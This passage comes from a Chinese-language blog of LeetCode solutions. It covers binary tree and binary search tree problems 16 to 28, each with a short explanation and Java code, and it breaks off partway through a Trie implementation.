class="markdownIt-Anchor" href="#16-得到左下角的节点"></a> 16. 得到左下角的节点</h3><p>  <a href="https://leetcode-cn.com/problems/find-bottom-left-tree-value/">https://leetcode-cn.com/problems/find-bottom-left-tree-value/</a></p><h4 id="思路-102"><a class="markdownIt-Anchor" href="#思路-102"></a> 思路</h4><p>  用辅助List，存先序遍历每个深度的第一个节点即可。</p><h4 id="代码-100"><a class="markdownIt-Anchor" href="#代码-100"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    List&lt;Integer&gt; res=<span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findBottomLeftValue</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        assist(root,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res.get(res.size()-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">assist</span><span class="params">(TreeNode root,<span class="keyword">int</span> depth)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span>(res.size()&lt;=depth)</span><br><span class="line">        &#123;</span><br><span class="line">            res.add(root.val);</span><br><span class="line">        &#125;</span><br><span class="line">        assist(root.left,depth+<span class="number">1</span>);</span><br><span class="line">        assist(root.right,depth+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="17-非递归实现二叉树的三种遍历"><a class="markdownIt-Anchor" href="#17-非递归实现二叉树的三种遍历"></a> 17. 非递归实现二叉树的三种遍历</h3><p>  前序遍历：<br />  <a href="https://leetcode-cn.com/problems/binary-tree-preorder-traversal/">https://leetcode-cn.com/problems/binary-tree-preorder-traversal/</a></p><p>  后序遍历：<br />  <a href="https://leetcode-cn.com/problems/binary-tree-postorder-traversal/">https://leetcode-cn.com/problems/binary-tree-postorder-traversal/</a></p><p>  中序遍历：<br />  <a href="https://leetcode-cn.com/problems/binary-tree-inorder-traversal/">https://leetcode-cn.com/problems/binary-tree-inorder-traversal/</a></p><h4 id="思路-103"><a class="markdownIt-Anchor" href="#思路-103"></a> 思路</h4><p>  用迭代就需要用辅助栈控制遍历顺序。<br />  前序遍历是<code>root-&gt;left-&gt;right</code>。<br />  后序遍历是<code>left-&gt;right-&gt;root</code>,其倒序是<code>root-&gt;right-&gt;left</code>。可以反向构造。<br />  中序遍历是<code>left-&gt;root-&gt;right</code>,需要先把左子树全入栈。</p><h4 id="代码-101"><a class="markdownIt-Anchor" href="#代码-101"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//前序遍历</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        List&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">        stack.push(root);</span><br><span class="line">        <span class="keyword">while</span> (!stack.isEmpty()) &#123;</span><br><span class="line">            TreeNode node = stack.pop();</span><br><span class="line">            <span class="keyword">if</span> (node == <span class="keyword">null</span>) </span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            res.add(node.val);</span><br><span class="line">            stack.push(node.right);</span><br><span class="line">            stack.push(node.left);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//后序遍历</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">postorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        LinkedList&lt;Integer&gt; res = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">        stack.push(root);</span><br><span class="line">        <span class="keyword">while</span> (!stack.isEmpty()) &#123;</span><br><span class="line">            TreeNode node = stack.pop();</span><br><span class="line">            <span class="keyword">if</span> (node == <span class="keyword">null</span>) </span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            res.addFirst(node.val);</span><br><span class="line">            stack.push(node.left);</span><br><span class="line">            stack.push(node.right);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//中序遍历</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">inorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">        TreeNode cur = root;</span><br><span class="line">        <span class="keyword">while</span> (cur != <span class="keyword">null</span> || !stack.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cur != <span class="keyword">null</span>) &#123;</span><br><span class="line">                stack.push(cur);</span><br><span class="line">                cur = cur.left;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cur = stack.pop();</span><br><span class="line">                list.add(cur.val);</span><br><span class="line">                cur = cur.right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="18-修剪二叉查找树"><a class="markdownIt-Anchor" href="#18-修剪二叉查找树"></a> 18. 修剪二叉查找树</h3><p>  <a href="https://leetcode-cn.com/problems/trim-a-binary-search-tree/submissions/">https://leetcode-cn.com/problems/trim-a-binary-search-tree/submissions/</a></p><h4 id="思路-104"><a class="markdownIt-Anchor" href="#思路-104"></a> 思路</h4><p>  如果当前节点符合区间，左右向下递归。<br />  如果当前节点小于区间，用当前节点右子树代替当前节点，然后递归。<br />  如果当前节点大于区间，用当前节点左子树代替当前节点，然后递归。</p><h4 id="代码-102"><a class="markdownIt-Anchor" href="#代码-102"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> TreeNode <span class="title">trimBST</span><span class="params">(TreeNode root, <span class="keyword">int</span> L, <span class="keyword">int</span> R)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(root.val&gt;=L&amp;&amp;root.val&lt;=R)</span><br><span class="line">        &#123;</span><br><span class="line">            root.left=trimBST(root.left,L,R);</span><br><span class="line">            root.right=trimBST(root.right,L,R);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(root.val&lt;L)</span><br><span class="line">            &#123;</span><br><span class="line">                root=trimBST(root.right,L,R);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                root=trimBST(root.left,L,R);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="19-寻找二叉查找树的第-k-个元素"><a class="markdownIt-Anchor" href="#19-寻找二叉查找树的第-k-个元素"></a> 19. 寻找二叉查找树的第 k 个元素</h3><p>  <a href="https://leetcode-cn.com/problems/kth-smallest-element-in-a-bst/">https://leetcode-cn.com/problems/kth-smallest-element-in-a-bst/</a></p><h4 id="思路-105"><a class="markdownIt-Anchor" href="#思路-105"></a> 思路</h4><p>  由二叉搜索树性质可知，对其进行中序遍历就可以还原其大小顺序，所以只需进行中序遍历，第K个元素就是第K小的。</p><h4 id="代码-103"><a class="markdownIt-Anchor" href="#代码-103"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">kthSmallest</span><span class="params">(TreeNode root, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="keyword">null</span>) </span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        kthSmallest(root.left, k);</span><br><span class="line">        count++;</span><br><span class="line">        <span class="keyword">if</span> (count == k) &#123;</span><br><span class="line">            res = root.val;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        kthSmallest(root.right, k);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="20-把二叉查找树每个节点的值都加上比它大的节点的值"><a class="markdownIt-Anchor" href="#20-把二叉查找树每个节点的值都加上比它大的节点的值"></a> 20. 把二叉查找树每个节点的值都加上比它大的节点的值</h3><p>  <a href="https://leetcode-cn.com/problems/convert-bst-to-greater-tree/">https://leetcode-cn.com/problems/convert-bst-to-greater-tree/</a></p><h4 id="思路-106"><a class="markdownIt-Anchor" href="#思路-106"></a> 思路</h4><p>  因为二叉查找树的大小顺序为<code>left&lt;root&lt;right</code>,所以按照<code>right-&gt;root-&gt;left</code>的顺序来遍历，并累加上所有遍历过的值即可。</p><h4 id="代码-104"><a class="markdownIt-Anchor" href="#代码-104"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> TreeNode <span class="title">convertBST</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        convertBST(root.right);</span><br><span class="line">        sum+=root.val;</span><br><span class="line">        root.val=sum;</span><br><span class="line">        convertBST(root.left);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="21-二叉查找树的最近公共祖先"><a class="markdownIt-Anchor" href="#21-二叉查找树的最近公共祖先"></a> 21. 二叉查找树的最近公共祖先</h3><p>  <a href="https://leetcode-cn.com/problems/lowest-common-ancestor-of-a-binary-search-tree/">https://leetcode-cn.com/problems/lowest-common-ancestor-of-a-binary-search-tree/</a></p><h4 id="思路-107"><a class="markdownIt-Anchor" href="#思路-107"></a> 思路</h4><p>  由二叉搜索树的特性可知，如果p,q都小于root，说明他们都在左子树，如果都大于root，说明都在右子树。<br />当<code>p&lt;=root.val&lt;=q</code>的时候，说明p，q分布在两侧，则Root是其最近的公共祖先。</p><h4 id="代码-105"><a class="markdownIt-Anchor" href="#代码-105"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> TreeNode <span class="title">lowestCommonAncestor</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(p.val&gt;q.val)</span><br><span class="line">        &#123;</span><br><span class="line">            TreeNode temp=p;</span><br><span class="line">            p=q;</span><br><span class="line">            q=temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(p.val&lt;=root.val&amp;&amp;q.val&gt;=root.val)</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        <span class="keyword">if</span>(q.val&lt;root.val)</span><br><span class="line">            <span class="keyword">return</span> lowestCommonAncestor(root.left,p,q);</span><br><span class="line">        <span class="keyword">return</span> lowestCommonAncestor(root.right,p,q);</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="22-二叉树的最近公共祖先"><a class="markdownIt-Anchor" href="#22-二叉树的最近公共祖先"></a> 22. 二叉树的最近公共祖先</h3><p>  <a href="https://leetcode-cn.com/problems/lowest-common-ancestor-of-a-binary-tree/">https://leetcode-cn.com/problems/lowest-common-ancestor-of-a-binary-tree/</a></p><h4 id="思路-108"><a class="markdownIt-Anchor" href="#思路-108"></a> 思路</h4><p>  对于任意P，Q如果我们递归进行寻找，直到找到P或者Q或者空，就该返回当前节点了，那么在返回之前，我们会遇到三种情况：</p><ol><li>左子树递归为空，右子树递归为空，说明两侧都没有，返回null。</li><li>左子树递归不为空，右子树递归不为空，说明两侧一边一个节点，那么当前节点就是最近公共祖先，返回当前节点。</li><li>有一边为空，说明两个节点都在另一边，递归该侧。</li></ol><h4 id="代码-106"><a class="markdownIt-Anchor" href="#代码-106"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> TreeNode <span class="title">lowestCommonAncestor</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>||root==q||root==p)</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        TreeNode left=lowestCommonAncestor(root.left,p,q);</span><br><span class="line">        TreeNode right=lowestCommonAncestor(root.right,p,q);</span><br><span class="line">        <span class="keyword">if</span>(left==<span class="keyword">null</span>&amp;&amp;right==<span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(left!=<span class="keyword">null</span>&amp;&amp;right!=<span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        <span class="keyword">if</span>(left==<span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> right;</span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="23-从有序数组中构造二叉查找树"><a class="markdownIt-Anchor" href="#23-从有序数组中构造二叉查找树"></a> 23. 从有序数组中构造二叉查找树</h3><p>  <a href="https://leetcode-cn.com/problems/convert-sorted-array-to-binary-search-tree/">https://leetcode-cn.com/problems/convert-sorted-array-to-binary-search-tree/</a></p><h4 id="思路-109"><a class="markdownIt-Anchor" href="#思路-109"></a> 思路</h4><p>  因为数组有序，故可以进行二分，用中值做根节点，左半部分构建左子树，右半部分构建右子树。</p><h4 id="代码-107"><a class="markdownIt-Anchor" href="#代码-107"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> TreeNode <span class="title">sortedArrayToBST</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums==<span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">return</span> build(nums,<span class="number">0</span>,nums.length-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">TreeNode <span class="title">build</span><span class="params">(<span class="keyword">int</span>[] nums,<span class="keyword">int</span> left,<span class="keyword">int</span> right)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(left&gt;right)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">int</span> mid=left+(right-left)/<span class="number">2</span>;</span><br><span class="line">        TreeNode root=<span class="keyword">new</span> TreeNode(nums[mid]);</span><br><span class="line">        root.left=build(nums,left,mid-<span class="number">1</span>);</span><br><span class="line">        root.right=build(nums,mid+<span class="number">1</span>,right);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="24-根据有序链表构造平衡的二叉查找树"><a class="markdownIt-Anchor" href="#24-根据有序链表构造平衡的二叉查找树"></a> 24. 根据有序链表构造平衡的二叉查找树</h3><p>  <a href="https://leetcode-cn.com/problems/convert-sorted-list-to-binary-search-tree/">https://leetcode-cn.com/problems/convert-sorted-list-to-binary-search-tree/</a></p><h4 id="思路-110"><a class="markdownIt-Anchor" href="#思路-110"></a> 思路</h4><p>  因为单链表有序，所以递归思想是：从单链表中部截断，取中间节点为root，两侧两段单链表分别构成左右子树，进行递归。</p><h4 id="代码-108"><a class="markdownIt-Anchor" href="#代码-108"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> TreeNode <span class="title">sortedListToBST</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="keyword">null</span>) </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(head.next == <span class="keyword">null</span>) </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> TreeNode(head.val);</span><br><span class="line">        ListNode slow=head;</span><br><span class="line">        ListNode fast=head;</span><br><span class="line">        ListNode beforeslow=<span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">while</span>(fast!=<span class="keyword">null</span>&amp;&amp;fast.next!=<span class="keyword">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            beforeslow=slow;</span><br><span class="line">            slow=slow.next;</span><br><span class="line">            fast=fast.next.next;</span><br><span class="line">        &#125;        </span><br><span class="line">        TreeNode root=<span class="keyword">new</span> TreeNode(slow.val);</span><br><span class="line">        beforeslow.next=<span class="keyword">null</span>;</span><br><span class="line">        root.left=sortedListToBST(head);</span><br><span class="line">        root.right=sortedListToBST(slow.next);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="25-在二叉查找树中寻找两个节点使它们的和为一个给定值"><a class="markdownIt-Anchor" href="#25-在二叉查找树中寻找两个节点使它们的和为一个给定值"></a> 25. 在二叉查找树中寻找两个节点，使它们的和为一个给定值</h3><p>  <a href="https://leetcode-cn.com/problems/two-sum-iv-input-is-a-bst/">https://leetcode-cn.com/problems/two-sum-iv-input-is-a-bst/</a></p><h4 id="思路-111"><a class="markdownIt-Anchor" href="#思路-111"></a> 思路</h4><p>  遍历二叉树，用辅助List保存所有节点值，因为是二叉搜索树，所以使用中序遍历可以获得有序List。<br />  然后查找List即可。</p><h4 id="代码-109"><a class="markdownIt-Anchor" href="#代码-109"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    List&lt;Integer&gt; nodes=<span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">findTarget</span><span class="params">(TreeNode root, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        Traversal(root);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,j=nodes.size()-<span class="number">1</span>;i&lt;j;)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> sum=nodes.get(i)+nodes.get(j);</span><br><span class="line">            <span class="keyword">if</span>(sum==k)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">if</span>(sum&lt;k)</span><br><span class="line">                i++;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                j--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Traversal</span><span class="params">(TreeNode root)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        Traversal(root.left);</span><br><span class="line">        nodes.add(root.val);</span><br><span class="line">        Traversal(root.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="26-在二叉查找树中查找两个节点之差的最小绝对值"><a class="markdownIt-Anchor" href="#26-在二叉查找树中查找两个节点之差的最小绝对值"></a> 26. 在二叉查找树中查找两个节点之差的最小绝对值</h3><p>  <a href="https://leetcode-cn.com/problems/minimum-absolute-difference-in-bst/">https://leetcode-cn.com/problems/minimum-absolute-difference-in-bst/</a></p><h4 id="思路-112"><a class="markdownIt-Anchor" href="#思路-112"></a> 思路</h4><ol><li>构造辅助List存放所有节点，然后遍历相邻两位的差值，取最小值。</li><li>利用二叉查找树的中序遍历为有序的性质，计算中序遍历中临近的两个节点之差的绝对值，取最小值。</li></ol><h4 id="代码-110"><a class="markdownIt-Anchor" href="#代码-110"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//辅助List</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    List&lt;Integer&gt; nodes=<span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getMinimumDifference</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        Traversal(root);</span><br><span class="line">        <span class="keyword">if</span>(nodes.size()&lt;<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> min=Math.abs(nodes.get(<span class="number">0</span>)-nodes.get(<span class="number">1</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;nodes.size();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            min=Math.min(min,Math.abs(nodes.get(i)-nodes.get(i-<span class="number">1</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> min;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Traversal</span><span class="params">(TreeNode root)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        Traversal(root.left);</span><br><span class="line">        nodes.add(root.val);</span><br><span class="line">        Traversal(root.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//直接计算</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> minDiff = Integer.MAX_VALUE;</span><br><span class="line">    <span class="keyword">private</span> TreeNode preNode = <span class="keyword">null</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getMinimumDifference</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        inOrder(root);</span><br><span class="line">        <span class="keyword">return</span> minDiff;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">inOrder</span><span class="params">(TreeNode node)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (node == <span class="keyword">null</span>) </span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        inOrder(node.left);</span><br><span class="line">        <span class="keyword">if</span> (preNode != <span class="keyword">null</span>) </span><br><span class="line">            minDiff = Math.min(minDiff, node.val - preNode.val);</span><br><span class="line">        preNode = node;</span><br><span class="line">        inOrder(node.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="27-寻找二叉查找树中出现次数最多的值"><a class="markdownIt-Anchor" href="#27-寻找二叉查找树中出现次数最多的值"></a> 27. 寻找二叉查找树中出现次数最多的值</h3><p>  <a href="https://leetcode-cn.com/problems/find-mode-in-binary-search-tree/">https://leetcode-cn.com/problems/find-mode-in-binary-search-tree/</a></p><h4 id="思路-113"><a class="markdownIt-Anchor" href="#思路-113"></a> 思路</h4><p>  对二叉搜索树用中序遍历一定是有序的，故直接中序遍历，然后统计长度。</p><h4 id="代码-111"><a class="markdownIt-Anchor" href="#代码-111"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> curcount=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line">    TreeNode prenode=<span class="keyword">null</span>;</span><br><span class="line">    List&lt;Integer&gt; maxlist=<span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] findMode(TreeNode root) &#123;</span><br><span class="line">        Traversal(root);</span><br><span class="line">        <span class="keyword">int</span>[] res=<span class="keyword">new</span> <span class="keyword">int</span>[maxlist.size()];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;maxlist.size();i++)</span><br><span class="line">            res[i]=maxlist.get(i);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Traversal</span><span class="params">(TreeNode root)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        Traversal(root.left);</span><br><span class="line">        <span class="keyword">if</span>(prenode!=<span class="keyword">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(prenode.val==root.val)</span><br><span class="line">                curcount++;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                curcount=<span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(curcount&gt;count)</span><br><span class="line">        &#123;</span><br><span class="line">            maxlist.clear();</span><br><span class="line">            maxlist.add(root.val);</span><br><span class="line">            count=curcount;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">if</span>(curcount==count)</span><br><span class="line">                maxlist.add(root.val);</span><br><span class="line">        prenode=root;</span><br><span class="line">        Traversal(root.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="28-实现一个-trie"><a class="markdownIt-Anchor" href="#28-实现一个-trie"></a> 28. 实现一个 Trie</h3><p>  <a href="https://leetcode-cn.com/problems/implement-trie-prefix-tree/">https://leetcode-cn.com/problems/implement-trie-prefix-tree/</a></p><h4 id="思路-114"><a class="markdownIt-Anchor" href="#思路-114"></a> 思路</h4><p>  Trie(字典树)是一种在字符串查找，前缀匹配等方面应用广泛的算法，它在查找字符串时只与被查询的字符串长度有关，所以它在查找时只有O(1)的时间复杂度，但随之而来的较大的空间复杂度。<br />  Trie的主要结构如下图所示：</p><p><img src="https://pic002.cnblogs.com/images/2012/363302/2012091115401883.jpg" alt="" /></p><p>  根节点不带有任何字母，然后每个节点向下都可以有26个分支(对于小写字母字典树而言，如果需要扩大范围，分支数量也会扩大)。分别对应了26个字母的选择，然后每个分支还会有26个字母，从而构建了一个从任何字母出发，可以到达任意字母的链路，从而可以用于表示任意单词。</p><h4 id="代码-112"><a class="markdownIt-Anchor" href="#代码-112"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Trie</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> TrieNode root;</span><br><span class="line">    <span class="comment">//定义字典类的数据结构</span></span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">TrieNode</span> </span>&#123;</span><br><span class="line">        <span 